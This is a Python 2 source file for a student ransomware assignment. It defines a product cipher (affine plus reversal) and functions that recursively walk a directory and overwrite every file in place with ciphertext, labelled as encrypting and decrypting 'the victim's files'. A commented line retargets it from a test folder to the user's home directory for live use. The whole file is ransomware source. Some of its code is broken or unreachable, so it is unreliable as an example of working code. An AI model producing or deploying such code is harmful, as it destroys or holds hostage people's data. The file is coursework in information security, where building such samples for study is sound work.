import os
import os.path
from os import listdir
from os.path import isfile, join

from AffineCipher import *
from ReverseCipher import *
from VigenereCipher import *

# ProductCipher class
# In here you'll find the individual ciphers implemented together, encryption/decryption functions and file handling functions
# Debug messages along with any code that doesn't work/isn't being used has been commented out

class ProductCipher(object):

    # Equivalent of a constructor in Python
    def __init__(self, key):
        self.key = key

    # Basic implementaion of product cipher - encryption and decryption on a string
    def main(self):
        message = 'hello' 
        key = 1576485 
        mode = 'encrypt'
        if mode == 'encrypt':
            encrypted_result = self.perform_encryption(key, message)
            print 'Plain text message: %s' %message
            print 'Encrypted message: %s' %encrypted_result
        elif mode == 'decrypt':
            plaintext = self.perform_decryption(key, message)
            print 'Original message: %s' %plaintext

    ################################################### Encryption functions ###################################################

    # For the product cipher I originally had 3 ciphers but this caused issues as some cipers expect different datatypes for the key...
    # As a result this caused an AttributeError for Vigenere - I didn't just want to copy the example on Moodle
    # Hopefully this still qualifies as a product cipher as I have used one transposition and one substitution
    # I understand that this product cipher is weaker without the third round of encryption from the Vigenere cipher
    # but is better than the ciphers individually    
    def perform_encryption(self, key, message):
        # Create class instances of ciphers
        reverse = ReverseCipher()
        affine = AffineCipher()
        vigenere = VigenereCipher()

        # Begin the process of converting the plaintext into ciphertext 
        # Round 1 Affine - Substitution
        rnd1_message = affine.encryptMessage(key, message) # params: key, message
        #print 'Round 1 of encryption using Affine: %s' %rnd1_message

        # Round 2 Reverse - Transposition
        rnd2_message = reverse.reverse(rnd1_message) # params: message
        #print 'Round 2 of encryption using Reverse: %s' %rnd2_message
        
        ciphertext = rnd2_message

        #vig_message = v_cipher.encryptMessage(affine_message, reverse_message) # Tried to do str(key), message but thought it might effect the encryption
        #print 'Round 3 of encryption using Vigenere:'
        #print vig_message

        # Return the ecrypted result so that it can be used by other functions
        return ciphertext

    # Encrypts an individual file
    def encrypt_specified_file(self, filename):
        # Open file as Read-Binary
        # Read the file contents and store in f_contents
        with open(filename, 'rb') as f:
            f_contents = f.read()
            #f_bytes = map(ord, f_contents)
            #print 'DEBUG: Array of decimal numbers which represent the original ASCII data...'
            #print f_bytes
            #print 'f_contents (plaintext): %s' %f_contents
        # Perform the product cipher on contents of the file    
        encrypted_contents = self.perform_encryption(self.key, f_contents)
        #print 'encrypted_contents (ciphertext): %s' %encrypted_contents
        f.close()
        # The map(aFunction, aSequence) function applies a passed-in function to each item in an iterable object
        #encrypted_contents = map(self.perform_encryption(self.key, f_contents), f_contents) 
        # Open file up
        with open(filename, 'wb') as f:
            # Save encrypted contents to file
            f.write(encrypted_contents)
            # Close the file
            f.close()

    # Encrypts all of the victim's files within a specified path
    def encrypt_victims_files(self):
        # Get the files to be encrypted
        list_of_files = self.get_list_of_files()

        # Encrypt every file in the list individually 
        for each_file in list_of_files:
            self.encrypt_specified_file(each_file)
    

    ################################################### Decryption functions ###################################################

    # This function is the same as the perform_encryption fuction 
    # but the opposite way round to retrieve the plaintext/original contents of the file
    def perform_decryption(self, key, message):
        # Create class instances of ciphers
        reverse = ReverseCipher()
        affine = AffineCipher()
        vigenere = VigenereCipher()
 
        #vig_message = v_cipher.decryptMessage(key, message) # key, message
        #print 'Round 1 of decryption using Vigenere:'
        #print vig_message

        # Round 1 Reverse - Transposition
        reverse_message = reverse.reverse(message) # params: message
        #print 'Round 1 of decryption using Reverse: %s' %reverse_message

        # Round 2 Affine - Substitution 
        affine_message = affine.decryptMessage(key, reverse_message) # params: key, message
        #print 'Round 2 of decryption using Affine: %s' %affine_message
        
        plaintext = affine_message 
        
        # Return the plaintext so it can be used by other functions
        return plaintext

    # Decrypts an individual file
    def decrypt_specified_file(self, filename):
        # Open file as Read-Binary
        # Read the encrypted file contents and store in f_contents
        with open(filename, 'rb') as f:
            f_contents = f.read()
        # Decrypt the encrypted contents and retrieve the plaintext/original contents
        plaintext = self.perform_decryption(self.key, f_contents)
        # Close the file
        f.close()
        with open(filename, 'wb') as f:
            # Save the original contents to the file
            f.write(plaintext)
            f.close()

    # Decrypts all of the victim's files that have previously been encrypted
    def decrypt_victims_files(self):
        # Get the files to be decrypted
        list_of_files = self.get_list_of_files()

        # Decrypt every file in the list individually 
        for each_file in list_of_files:
            self.decrypt_specified_file(each_file)            

    ################################################### Helper functions ###################################################

    # Returns all files from a specified directory tree
    def get_list_of_files(self):
        # Path for testing
        path = "C:\Users\user\Google Drive\Documents\Uni\Year 3\Information Security\Ransomware Assignment\Project\Source code\_test files"
        
        # Path for live ransomware - gets the victim's home directory, also cross platform
        #path = os.path.expanduser('~user')
        
        list_of_files = []

        # os.walk generates the file names in a directory tree by walking the tree
        # Directory -> Sub directories -> Files inside those subdirectories
        # Gets all files at given path
        for directory, subDirectories, files in os.walk(path):
            for filename in files:
                # Add directory and filename to list
                list_of_files.append(directory + "\\" + filename)

                #list_of_files += os.path.join(directory, fname)
                #print os.path.join(directory, fname)
        # Return the list so other functions can use it        
        return list_of_files

        # If ProductCipher.py is run (instead of imported as a module) call
        # the main() function.
        if __name__ == '__main__':self.main()
